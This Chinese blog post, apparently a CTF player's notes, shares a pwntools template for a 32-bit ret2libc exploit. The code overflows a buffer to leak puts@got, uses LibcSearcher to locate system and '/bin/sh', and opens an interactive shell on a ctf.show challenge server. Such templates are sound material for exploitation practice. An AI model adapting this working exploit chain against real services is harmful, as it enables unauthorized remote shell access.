---
title: "32位ret2libc-LibcSearcher-template"
published: 2026-05-08T19:12:00+08:00
description: "记录一个 32 位 ret2libc 配合 LibcSearcher 的利用模板。"
image: ""
tags: ["模板", "Pwn", "ret2libc", "LibcSearcher"]
category: "模板"
categoryPath: ["模板"]
series: ""
draft: false
lang: "zh_CN"
---

附件：[`exp.py`](/attachments/模板/32位ret2libc-LibcSearcher-template/exp.py)

这个模板是在基础 pwntools 起手式上补了一轮 `puts@got` 泄露，然后直接交给 `LibcSearcher` 反推 `system` 和 `"/bin/sh"`。

```python
"""
- 本地正常：python3 exp.py
- 本地 debug：python3 exp.py DEBUG
- 远程正常：python3 exp.py REMOTE
- 远程 debug 日志：python3 exp.py REMOTE DEBUG
"""
from pwn import *
from LibcSearcher import *

context(os="linux", terminal=["cmd.exe", "/c", "start"])

binary_path = "./pwn"
host = "pwn.challenge.ctf.show"  # 地址
port = 28251  # 端口

elf = ELF(binary_path, checksec=False)
context.binary = elf

if elf.bits == 64:
    context.arch = "amd64"
    gdbscript = """
    b *main
    c
    """
else:
    context.arch = "i386"
    gdbscript = """
    b *main
    c
    """

if args.DEBUG:
    context.log_level = "debug"
else:
    context.log_level = "info"

if args.REMOTE:
    io = remote(host, port)
else:
    io = process(binary_path)
    if args.DEBUG:
        gdb.attach(io, gdbscript=gdbscript)


def p():
    pause()


offset = 0x88 + 4
main_addr = elf.symbols["main"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

payload = b"A" * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)
io.sendline(payload)

puts_addr = u32(io.recv()[0:4])
print(hex(puts_addr))

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
print(hex(libc_base))

system_addr = libc.dump("system") + libc_base
binsh_addr = libc.dump("str_bin_sh") + libc_base

payload = b"A" * offset + p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.sendline(payload)

io.interactive()
```
